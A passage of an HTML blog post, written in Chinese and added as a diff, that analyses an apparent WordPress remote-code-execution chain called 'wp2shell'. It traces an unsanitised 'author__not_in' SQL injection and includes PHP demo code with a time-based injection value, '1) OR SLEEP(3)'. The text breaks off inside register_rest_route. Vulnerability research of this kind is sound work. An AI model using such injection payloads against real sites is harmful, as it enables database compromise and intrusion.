@@ -1,0 +1,1079 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"ayan0.top","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.24.1","exturl":false,"sidebar":{"position":"left","width_expanded":280,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":false,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="WordPress-RCE-Series(1) 最近WordPress好像一连炸了好几个洞出来啊 而且还都是可以直接RCE的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WordPress-RCE-Series-1">
+<meta property="og:url" content="https://ayan0.top/2026/10/26/WordPress-RCE-Series-1/">
+<meta property="og:site_name" content="Blog of AyaN0">
+<meta property="og:description" content="WordPress-RCE-Series(1) 最近WordPress好像一连炸了好几个洞出来啊 而且还都是可以直接RCE的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018093600278.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018101114552.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018101205372.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018103559640.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018105428541.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018122031674.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018122804138.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018133947303.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018135627409.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018143357143.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018144009120.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018144644212.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018151841196.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025151035447.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025151600387.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025222621232.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025223225137.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025224818217.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025224431868.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025231536848.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026004553334.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018160054389.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025172129612.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025195039852.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025144847063.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025144925590.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261025222007715.png">
+<meta property="og:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261026015009459.png">
+<meta property="article:published_time" content="2026-10-25T17:53:14.000Z">
+<meta property="article:modified_time" content="2026-10-25T18:18:44.433Z">
+<meta property="article:author" content="AyaN0">
+<meta property="article:tag" content="Audit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018093600278.png">
+
+
+<link rel="canonical" href="https://ayan0.top/2026/10/26/WordPress-RCE-Series-1/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://ayan0.top/2026/10/26/WordPress-RCE-Series-1/","path":"2026/10/26/WordPress-RCE-Series-1/","title":"WordPress-RCE-Series-1"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>WordPress-RCE-Series-1 | Blog of AyaN0</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+      <img class="custom-logo-image" src="/images/lly.jpg" alt="Blog of AyaN0">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Blog of AyaN0</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#wordpress-rce-series1"><span class="nav-number">1.</span> <span class="nav-text"> WordPress-RCE-Series(1)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#the-component-of-wp2shell"><span class="nav-number">1.1.</span> <span class="nav-text"> The component of wp2shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#a-sql-without-sanitization"><span class="nav-number">1.2.</span> <span class="nav-text"> A SQL without sanitization</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#the-api-in-wordpress"><span class="nav-number">1.3.</span> <span class="nav-text"> The API in Wordpress</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#a-successful-sql-injectionor-not"><span class="nav-number">1.4.</span> <span class="nav-text"> A successful SQL injection,or not?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#how-wp-handle-the-request"><span class="nav-number">1.5.</span> <span class="nav-text"> How WP handle the request?</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#has_valid_params"><span class="nav-number">1.5.1.</span> <span class="nav-text"> has_valid_params</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sanitize_params"><span class="nav-number">1.5.2.</span> <span class="nav-text"> sanitize_params</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#batch-route-confusion"><span class="nav-number">1.6.</span> <span class="nav-text"> Batch route confusion</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#foreach-1"><span class="nav-number">1.6.1.</span> <span class="nav-text"> foreach 1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#foreach-2"><span class="nav-number">1.6.2.</span> <span class="nav-text"> foreach 2</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-bugs-lead-to-wp2shell"><span class="nav-number">1.7.</span> <span class="nav-text"> 2 bugs lead to wp2shell</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="AyaN0"
+      src="/images/lly.jpg">
+  <p class="site-author-name" itemprop="name">AyaN0</p>
+  <div class="site-description" itemprop="description">不断的前进的人:只有0次摔倒或无数次的爬起</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">34</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kisakiayano" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kisakiayano" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/1594453512@qq.com" title="E-Mail → 1594453512@qq.com" rel="noopener me"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://ayan0.top/2026/10/26/WordPress-RCE-Series-1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lly.jpg">
+      <meta itemprop="name" content="AyaN0">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Blog of AyaN0">
+      <meta itemprop="description" content="不断的前进的人:只有0次摔倒或无数次的爬起">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="WordPress-RCE-Series-1 | Blog of AyaN0">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WordPress-RCE-Series-1
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-10-26 01:53:14 / 修改时间：02:18:44" itemprop="dateCreated datePublished" datetime="2026-10-26T01:53:14+08:00">2026-10-26</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>18k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>33 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="wordpress-rce-series1"><a class="markdownIt-Anchor" href="#wordpress-rce-series1"></a> WordPress-RCE-Series(1)</h1>
+<p>最近WordPress好像一连炸了好几个洞出来啊</p>
+<p>而且还都是可以直接RCE的</p>
+<p>于是简单的整理了最近比较严重的洞，准备分开发几篇博客讲完</p>
+<p>第一篇我们就从这次AI挖WordPress的源头开始吧，wp2shell</p>
+<h2 id="the-component-of-wp2shell"><a class="markdownIt-Anchor" href="#the-component-of-wp2shell"></a> The component of wp2shell</h2>
+<p>wp2shell本质是两个洞的组合利用，分别是CVE-2026-63030 + CVE-2026-60137</p>
+<p>好熟悉的组合技，想你了React2shell(这个的分析后面也会发)</p>
+<p>看报告似乎是通过一个REST API 批量路由混淆+SQL注入来制造攻击面</p>
+<p>跟着漏洞发现者的文章来走一遍看看呢</p>
+<p><a target="_blank" rel="noopener" href="https://www.slcyber.io/research/exploit-brokers-pay-500000-for-a-wordpress-rce-i-found-one-with-gpt5-6">https://www.slcyber.io/research/exploit-brokers-pay-500000-for-a-wordpress-rce-i-found-one-with-gpt5-6</a></p>
+<h2 id="a-sql-without-sanitization"><a class="markdownIt-Anchor" href="#a-sql-without-sanitization"></a> A SQL without sanitization</h2>
+<p>我看的是wordpress-7.0.1的源码</p>
+<p>这里我们先看比较简单的SQL注入部分</p>
+<p>来到wp-includes/class-wp-query.php</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018093600278.png" alt="image-20261018093600278"></p>
+<p>简单审计上下文代码，可以发现这里是在做对查询文章筛选的功能，筛选依据是需要排除的作者id</p>
+<p>这里先判断<code>$query_vars</code>中的<code>author__not_in</code>是否为空</p>
+<p>接着判断是否为数组，若为数组则就对其中的元素使用 absint方法，接着再进行去重</p>
+<p>最后将id进行拼接并再拼接到SQL语句中去</p>
+<p><strong>但是如果<code>author__not_in</code>就不是数组呢?</strong></p>
+<p>源码并没有对这个做处理</p>
+<p>让我们写一个demo看一下</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="function"><span class="keyword">function</span> <span class="title">absint</span>(<span class="params"> <span class="variable">$maybeint</span> </span>) </span>&#123;
+    <span class="keyword">return</span> <span class="title function_ invoke__">abs</span>( (<span class="keyword">int</span>) <span class="variable">$maybeint</span> );
+&#125;
+
+<span class="variable">$query_vars</span>=<span class="keyword">array</span>(
+    <span class="string">&#x27;author__not_in&#x27;</span>=&gt;<span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>),
+);
+<span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span>;
+<span class="keyword">if</span> ( ! <span class="keyword">empty</span>( <span class="variable">$query_vars</span>[<span class="string">&#x27;author__not_in&#x27;</span>] ) ) &#123;
+    <span class="keyword">if</span> ( <span class="title function_ invoke__">is_array</span>( <span class="variable">$query_vars</span>[<span class="string">&#x27;author__not_in&#x27;</span>] ) ) &#123;
+        <span class="variable">$query_vars</span>[<span class="string">&#x27;author__not_in&#x27;</span>] = <span class="title function_ invoke__">array_unique</span>( <span class="title function_ invoke__">array_map</span>( <span class="string">&#x27;absint&#x27;</span>, <span class="variable">$query_vars</span>[<span class="string">&#x27;author__not_in&#x27;</span>] ) );
+        <span class="title function_ invoke__">sort</span>( <span class="variable">$query_vars</span>[<span class="string">&#x27;author__not_in&#x27;</span>] );
+        <span class="keyword">echo</span> <span class="string">&quot;execute sanitization\n&quot;</span>;
+    &#125;
+    <span class="variable">$author__not_in</span> = <span class="title function_ invoke__">implode</span>( <span class="string">&#x27;,&#x27;</span>, (<span class="keyword">array</span>) <span class="variable">$query_vars</span>[<span class="string">&#x27;author__not_in&#x27;</span>] );
+    <span class="variable">$where</span>         .= <span class="string">&quot; AND result.post_author NOT IN (<span class="subst">$author__not_in</span>) &quot;</span>;
+&#125; <span class="keyword">elseif</span> ( ! <span class="keyword">empty</span>( <span class="variable">$query_vars</span>[<span class="string">&#x27;author__in&#x27;</span>] ) ) &#123;
+    <span class="keyword">if</span> ( <span class="title function_ invoke__">is_array</span>( <span class="variable">$query_vars</span>[<span class="string">&#x27;author__in&#x27;</span>] ) ) &#123;
+        <span class="variable">$query_vars</span>[<span class="string">&#x27;author__in&#x27;</span>] = <span class="title function_ invoke__">array_unique</span>( <span class="title function_ invoke__">array_map</span>( <span class="string">&#x27;absint&#x27;</span>, <span class="variable">$query_vars</span>[<span class="string">&#x27;author__in&#x27;</span>] ) );
+        <span class="title function_ invoke__">sort</span>( <span class="variable">$query_vars</span>[<span class="string">&#x27;author__in&#x27;</span>] );
+    &#125;
+    <span class="variable">$author__in</span> = <span class="title function_ invoke__">implode</span>( <span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_map</span>( <span class="string">&#x27;absint&#x27;</span>, <span class="title function_ invoke__">array_unique</span>( (<span class="keyword">array</span>) <span class="variable">$query_vars</span>[<span class="string">&#x27;author__in&#x27;</span>] ) ) );
+    <span class="variable">$where</span>     .= <span class="string">&quot; AND result.post_author IN (<span class="subst">$author__in</span>) &quot;</span>;
+&#125;
+<span class="title function_ invoke__">print_r</span>( <span class="variable">$where</span> );</code></pre>
+<p>这是一个正常的运行样例</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018101114552.png" alt="image-20261018101114552"></p>
+<p>我们发现结果是符合预期的</p>
+<p>那么如果把<code>author__not_in</code>映射到一个字符串呢?</p>
+<pre><code class="highlight php"><span class="meta">&lt;?php</span>
+<span class="function"><span class="keyword">function</span> <span class="title">absint</span>(<span class="params"> <span class="variable">$maybeint</span> </span>) </span>&#123;
+    <span class="keyword">return</span> <span class="title function_ invoke__">abs</span>( (<span class="keyword">int</span>) <span class="variable">$maybeint</span> );
+&#125;
+
+<span class="variable">$query_vars</span>=<span class="keyword">array</span>(
+    <span class="string">&#x27;author__not_in&#x27;</span>=&gt;<span class="string">&#x27;1) OR SLEEP(3)&#x27;</span>,
+);
+<span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span>;
+<span class="keyword">if</span> ( ! <span class="keyword">empty</span>( <span class="variable">$query_vars</span>[<span class="string">&#x27;author__not_in&#x27;</span>] ) ) &#123;
+    <span class="keyword">if</span> ( <span class="title function_ invoke__">is_array</span>( <span class="variable">$query_vars</span>[<span class="string">&#x27;author__not_in&#x27;</span>] ) ) &#123;
+        <span class="variable">$query_vars</span>[<span class="string">&#x27;author__not_in&#x27;</span>] = <span class="title function_ invoke__">array_unique</span>( <span class="title function_ invoke__">array_map</span>( <span class="string">&#x27;absint&#x27;</span>, <span class="variable">$query_vars</span>[<span class="string">&#x27;author__not_in&#x27;</span>] ) );
+        <span class="title function_ invoke__">sort</span>( <span class="variable">$query_vars</span>[<span class="string">&#x27;author__not_in&#x27;</span>] );
+        <span class="keyword">echo</span> <span class="string">&quot;execute sanitization\n&quot;</span>;
+    &#125;
+    <span class="variable">$author__not_in</span> = <span class="title function_ invoke__">implode</span>( <span class="string">&#x27;,&#x27;</span>, (<span class="keyword">array</span>) <span class="variable">$query_vars</span>[<span class="string">&#x27;author__not_in&#x27;</span>] );
+    <span class="variable">$where</span>         .= <span class="string">&quot; AND result.post_author NOT IN (<span class="subst">$author__not_in</span>) &quot;</span>;
+&#125; <span class="keyword">elseif</span> ( ! <span class="keyword">empty</span>( <span class="variable">$query_vars</span>[<span class="string">&#x27;author__in&#x27;</span>] ) ) &#123;
+    <span class="keyword">if</span> ( <span class="title function_ invoke__">is_array</span>( <span class="variable">$query_vars</span>[<span class="string">&#x27;author__in&#x27;</span>] ) ) &#123;
+        <span class="variable">$query_vars</span>[<span class="string">&#x27;author__in&#x27;</span>] = <span class="title function_ invoke__">array_unique</span>( <span class="title function_ invoke__">array_map</span>( <span class="string">&#x27;absint&#x27;</span>, <span class="variable">$query_vars</span>[<span class="string">&#x27;author__in&#x27;</span>] ) );
+        <span class="title function_ invoke__">sort</span>( <span class="variable">$query_vars</span>[<span class="string">&#x27;author__in&#x27;</span>] );
+    &#125;
+    <span class="variable">$author__in</span> = <span class="title function_ invoke__">implode</span>( <span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">array_map</span>( <span class="string">&#x27;absint&#x27;</span>, <span class="title function_ invoke__">array_unique</span>( (<span class="keyword">array</span>) <span class="variable">$query_vars</span>[<span class="string">&#x27;author__in&#x27;</span>] ) ) );
+    <span class="variable">$where</span>     .= <span class="string">&quot; AND result.post_author IN (<span class="subst">$author__in</span>) &quot;</span>;
+&#125;
+<span class="title function_ invoke__">print_r</span>( <span class="variable">$where</span> );</code></pre>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018101205372.png" alt="image-20261018101205372"></p>
+<p>此时就出现问题了，前面对元素的absint被直接绕过，并且此时对字符串也是完全信任，没有进行任何额外的检查</p>
+<p>我们再看看后续有没有做过滤呢?</p>
+<p>这个函数最后返回的是<code>$this-&gt;posts</code></p>
+<p>中间对<code>$where</code>的都是拼接逻辑，只有这里通用的对<code>$where</code>拼接给其他变量</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018103559640.png" alt="image-20261018103559640"></p>
+<p>最后落到<code>$this-&gt;request</code></p>
+<p>我们继续跟这个变量</p>
+<p>发现后续根本没有做进一步的过滤，直接用<code>$wpdb</code>去做执行了</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018105428541.png" alt="image-20261018105428541"></p>
+<p>此时就造成了SQL注入</p>
+<h2 id="the-api-in-wordpress"><a class="markdownIt-Anchor" href="#the-api-in-wordpress"></a> The API in Wordpress</h2>
+<p>但是光有SQL注入也不够，需要一个外部的调用点</p>
+<p>我们先看前面的点在哪里被注册为了路由</p>
+<p>网上稍微做了一下信息收集，发现WordPress的路由注册方式主要是REST API</p>
+<p>那么我们就可以缩小查找的范围</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018122031674.png" alt="image-20261018122031674"></p>
+<p>同时这里还要注意前面的<code>get_posts</code>函数还有一个包裹点</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018122804138.png" alt="image-20261018122804138"></p>
+<p>接下来找直接调用和通过<code>query()</code>对<code>get_posts</code>的间接调用就好了</p>
+<p>最后发现在这三个文件中都有真实调用</p>
+<pre><code class="highlight plaintext">class-wp-rest-global-styles-revisions-controllre.php
+class-wp-rest-revisions-controller.php
+class-wp-rest-posts-controller.php</code></pre>
+<p>对应的类的方法为</p>
+<pre><code class="highlight plaintext">WP_REST_Global_Styles_Revisions_Controller#get_items
+WP_REST_Revisions_Controller#get_items
+WP_REST_Posts_Controller#get_items</code></pre>
+<p>并且<code>WP_REST_Global_Styles_Revisions_Controller</code>是继承的<code>WP_REST_Revisions_Controller</code></p>
+<p>那么就有趣起来了</p>
+<p>猜测每次请求Controller都会默认先调用<code>get_items</code>来处理请求</p>
+<p>看了眼发现确实是</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20261018133947303.png" alt="image-20261018133947303"></p>
+<p>这里的<code>WP_REST_Server::READABLE</code>就是GET</p>
+<p>也就是说当使用<strong>GET</strong>访问这些route时就会触发get_items方法进行响应(<strong>下文要考</strong>)</p>
+<p>再看看路由的命名逻辑，看到<code>register_rest_route</code>方法上</p>
+<p>省略掉一些错误处理，主体差不多就是这样</p>
+<pre><code class="highlight php"><span class="function"><span class="keyword">function</span> <span class="title">register_rest_route</span>(<span class="params"> <span class="variable">$route_namespace</span>, <span class="variable">$route</span>, <span class="variable">$args</span> = <span class="keyword">array</span>(<span class="params"></span>), <span class="variable">$override</span> = <span class="literal">false</span> </span>) </span>&#123;
+	<span class="variable">$clean_namespace</span> = <span class="title function_ invoke__">trim</span>( <span class="variable">$route_namespace</span>, <span class="string">&#x27;/&#x27;</span> );
+
+	<span class="keyword">if</span> ( <span class="keyword">isset</span>( <span class="variable">$args</span>[<span class="string">&#x27;args&#x27;</span>] ) ) &#123;
+		<span class="variable">$common_args</span> = <span class="variable">$args</span>[<span class="string">&#x27;args&#x27;</span>];
+		<span class="keyword">unset</span>( <span class="variable">$args</span>[<span class="string">&#x27;args&#x27;</span>] );
+	&#125; <span class="keyword">else</span> &#123;
+		<span class="variable">$common_args</span> = <span class="keyword">array</span>();
+	&#125;
+
+	<span class="keyword">if</span> ( <span class="keyword">isset</span>( <span class="variable">$args</span>[<span class="string">&#x27;callback&#x27;</span>] ) ) &#123;
+		<span class="comment">// Upgrade a single set to multiple.</span>
+		<span class="variable">$args</span> = <span class="keyword">array</span>( <span class="variable">$args</span> );
+	&#125;
+
+	<span class="variable">$defaults</span> = <span class="keyword">array</span>(
+		<span class="string">&#x27;methods&#x27;</span>  =&gt; <span class="string">&#x27;GET&#x27;</span>,
+		<span class="string">&#x27;callback&#x27;</span> =&gt; <span class="literal">null</span>,
+		<span class="string">&#x27;args&#x27;</span>     =&gt; <span class="keyword">array</span>(),
+	);
+
+	<span class="keyword">foreach</span> ( <span class="variable">$args</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; &amp;<span class="variable">$arg_group</span> ) &#123;
+		<span class="keyword">if</span> ( ! <span class="title function_ invoke__">is_numeric</span>( <span class="variable">$key</span> ) ) &#123;
+			<span class="comment">// Route option, skip here.</span>
+			<span class="keyword">continue</span>;
+		&#125;
+
+		<span class="variable">$arg_group</span>         = <span class="title function_ invoke__">array_merge</span>( <span class="variable">$defaults</span>, <span class="variable">$arg_group</span> );
+		<span class="variable">$arg_group</span>[<span class="string">&#x27;args&#x27;</span>] = <span class="title function_ invoke__">array_merge</span>( <span class="variable">$common_args</span>, <span class="variable">$arg_group</span>[<span class="string">&#x27;args&#x27;</span>] );
